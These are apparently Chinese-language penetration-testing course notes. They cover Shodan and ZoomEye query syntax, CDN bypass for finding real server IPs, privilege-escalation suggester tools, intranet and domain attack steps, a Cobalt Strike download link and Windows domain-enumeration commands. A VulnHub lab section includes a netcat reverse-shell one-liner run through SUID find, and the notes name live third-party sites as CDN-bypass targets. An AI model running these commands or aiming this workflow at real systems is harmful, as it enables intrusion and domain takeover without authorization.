	Shodan，是一个暗黑系的谷歌，作为一个针对网络设备的搜索引擎，它可以在极短的时间内在全球设备中搜索到你想找的设备信息。对于渗透工作者来说，就是一个辅助我们寻找靶机的好助手。

2.内置语法
	
	Shodan的参数有很多，这里只介绍简单的几种
	hostname："主机或域名"
	如 hostname:"google''
	
	port："端口或服务"
	如 port:"21"
	
	ip : "ip地址"
	如 ip : "168.205.71.64"
	
	net："IP地址或子网"
	
	如 net:"210.45.240.0/24"
	
	vuln :指定漏洞的cve
	
	如 vuln:CVE-2015-8869
	
	但是这个命令最好搭配起来使用，如 country:CN vuln:CVE-2014-0160
	
	os :"操作系统"
	
	​ 如 os:"centOS"
	
	isp："ISP供应商"
	
	如 isp:"China Telecom"
	
	product："操作系统/软件/平台"
	
	如 product:"Apache httpd"
	
	version："软件版本"
	
	如 version:"3.1.6"
	
	geo："经纬度"
	
	如 geo:"39.8779,116.4550"
	
	country`："国家"
	
	如 country:"China"
	country:"UN"
	
	city："城市"
	如 city:"Hefei"
	
	org："组织或公司"
	如 org:"google"
	
	before/after："日/月/年"
	如 before:"25/09/2017"
	after:"25/09/2017"
	
	asn : "自治系统号码"
	如 asn:"AS2233"


3.脚本使用

	项目地址：https://github.com/achillean/shodan-python


拓展：自主开发

	官方文档：https://shodan.readthedocs.io/en/latest/index.html

案例测试：
1.phpstudy采集
2.子域名信息采集
3.特定漏洞靶机采集


#zoomeye
内置语法
	ZoomEye搜索技巧
	指定搜索的组件以及版本
	app：组件名称
	ver：组件版本
	例如：搜索 apache组件    版本2.4
	app:apache ver:2.4

	指定搜索的端口
	port:端口号
	例如：搜索开放了SSH端口的主机
	port:22
	一些服务器可能监听了非标准的端口。
	要按照更精确的协议进行检索，可以使用service进行过滤。
	
	指定搜索的操作系统
	OS:操作系统名称
	例如：搜索Linux操作系统
	OS：Linux

	指定搜索的服务
	service：服务名称
	例如，搜素SSH服务
	Service：SSH

	指定搜索的地理位置范
	country：国家
	city：城市名
	例如：
	country:China
	city：Beijing

	搜索指定的CIDR网段
	CIDR:网段区域
	例如：
	CIDR：192.168.158.12/24

	搜索指定的网站域名
	Site:网站域名
	例如：
	site:www.baidu.com

	搜索指定的主机名
	Hostname:主机名
	例如：
	hostname:zwl.cuit.edu.cn

	搜索指定的设备名
	Device：设备名
	例如：
	device:router

	搜索具有特定首页关键词的主机
	Keyword：关键词
	例如：
	keyword:technology

脚本开发

	官方手册:https://www.zoomeye.org/doc


#补充：谷歌黑客高级玩法

	https://www.uedbox.com/shdb/
	https://www.uedbox.com/post/54776/

#补充：其他漏洞
	CSRF 跨站请求伪造 简单讲解
		参考：https://www.cnblogs.com/phpstudy2015-6/p/6771239.html
	SSRF 前面已讲
	XXE  xml实体注入
		1.本地简易代码演示
		参考：https://uknowsec.cn/posts/notes/XML实体注入漏洞的利用与学习.html
		2.实例：Zblog xxe 任意文件读取
		下载：https://bbs.zblogcn.com/thread-88670.html



#系统提权补充
自动检测：
	
	项目地址：
		https://github.com/GDSSecurity/Windows-Exploit-Suggester
		https://github.com/jondonas/linux-exploit-suggester-2
	安装:
		1.python windows-exploit-suggester.py --update （python2）
		2.pip install xlrd --upgrade 安装插件库
		3.python windows-exploit-suggester.py --database 2019-xx.xls --systeminfo xx.txt
		
	案例1：Windows 2008/7     test
	案例2：Linux-DC-1 vunlhub test 
		https://www.vulnhub.com/entry/dc-1-1,292/
		https://www.jianshu.com/p/0c22c450f971
		find suidtest -exec netcat -e /bin/sh  192.168.x.x 1234 \;

Windows集合归类:
https://github.com/SecWiki/windows-kernel-exploits

linux集合归类:
https://github.com/SecWiki/linux-kernel-exploits

本地联网漏扫：Vulmap https://github.com/vulmon/Vulmap/

#CDN技术集锦
	1.什么是CDN，它有哪些影响？
	2.如何检测目标是否存在CDN？
		超级ping，nslookup
	3.常见CDN绕过获取真实IP方法？
		子域名查询
		国外地址请求
		邮件服务查询
		其他方法：遗留文件，扫全网，黑暗引擎，dns历史记录，以量打量
		https://www.lstazl.com/cdn检测与绕过/
		https://www.fujieace.com/penetration-test/cdn-find-ip.html
		
案例1：对比有CDN及无CDN的区别

案例2：CDN目标真实IP探针演示

		1.www.sp910.com 子域名及get-site-ip获取 
		2.www.xuexila.com 国外地址请求
		3.www.kuk8.com   ssl证书查询
		4.www.ldfaka.com 邮件测试
案例3：CDN相关脚本工具使用介绍

		https://github.com/boy-hack/w8fuckcdn
		https://github.com/Tai7sy/fuckcdn


#重整旗鼓  
	信息收集汇总篇
		WEB
		信息收集：子域名、开放端口、端口指纹、c段地址、敏感目录、链接爬取等信息进行批量搜集
		常用工具：layer,subdomainbrute,nmap,masscan,7kbscan,dirbuster,whatweb,bugscaner等	
		相关工具一体化工具推荐：fuzzscanner
	
		APP或程序
		提前进行反编译或抓包
		1.简易APP抓包
		2.简易APP反编译
		3.简易执行文件抓包
		将测试中的相关URL与WEB相结合进行上一步信息收集
	




#内网安全
域环境下载
链接：https://pan.baidu.com/s/1j7OgZ3pOnSNxBCHbnUZ4SQ
提取码：z7m8

xiaodi8.com 域控服务器

www.xiaodi8.com   ==>  服务器   ==>  IP地址
bbs.xiaodi8.com   ==>  服务器   ==>  IP地址
news.xiaodi8.com  ==>  服务器   ==>  IP地址
mail.xiaodi8.com  ==>  服务器   ==>  IP地址



#内网测试
测试环境：http://vulnstack.qiyuanxuetang.net/vuln/

测试步骤：

	1.扫描获取目标端口信息
	2.利用phpmyadmin获取shell或web应用获取shell
	3.提权进行信息收集获取域相关信息
	4.利用口令传递凭据测试域成员
	5.利用内容krb哈希测试获取域控权限


Cobaltstrike下载链接: 
https://pan.baidu.com/s/1oJPRfh6-2oOUUKJAF0I2_A 提取码：3drd
参考视频：https://www.bilibili.com/video/av45380497?p=18

补充命令：
	
	ipconfig /all    查询本机IP段，所在域等
	net config Workstation    当前计算机名，全名，用户名，系统版本，工作站域，登陆域
	net user    本机用户列表
	net localhroup administrators    本机管理员[通常含有域用户]
	net user /domain    查询域用户
	net user 用户名 /domain    获取指定用户的账户信息
	net user /domain b404 pass    修改域内用户密码，需要管理员权限
	net group /domain    查询域里面的工作组
	net group 组名 /domain    查询域中的某工作组
	net group "domain admins" /domain    查询域管理员列表
	net group "domain controllers" /domain    查看域控制器(如果有多台)
	net time /domain    判断主域，主域服务器都做时间服务器
	ipconfig /all    查询本机IP段，所在域等